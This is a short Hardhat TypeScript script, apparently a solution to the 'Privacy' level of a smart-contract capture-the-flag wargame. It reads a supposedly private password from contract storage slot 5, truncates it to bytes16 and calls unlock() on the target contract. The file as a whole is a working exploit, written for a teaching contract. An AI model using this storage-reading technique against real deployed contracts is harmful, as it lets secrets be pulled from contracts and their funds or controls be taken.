import { ethers } from 'hardhat'
import { Privacy } from '../types/typechain/Privacy'

async function main() {
  const target = '0x6FbAd033BD4e5209E6f8A5A1faC4dB19a6501aEA'
  const factory = await ethers.getContractFactory('Privacy')
  const privacy = factory.attach(target) as Privacy

  // For slot nummeration look at contract, I documented it there
  const dataAtSlot = await ethers.provider.getStorageAt(privacy.address, 5)
  console.log('dataAtSlot', dataAtSlot.length)
  console.log('DS bytes32', dataAtSlot)
  console.log('DS bytes16', dataAtSlot.substring(0, 34))

  // Here is a nice explanation for conversion
  // https://www.tutorialspoint.com/solidity/solidity_conversions.htm

  await privacy.unlock(dataAtSlot.substring(0, 34))
  console.log('Exploit executed successfully ᕦ(ò_óˇ)ᕤ')
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
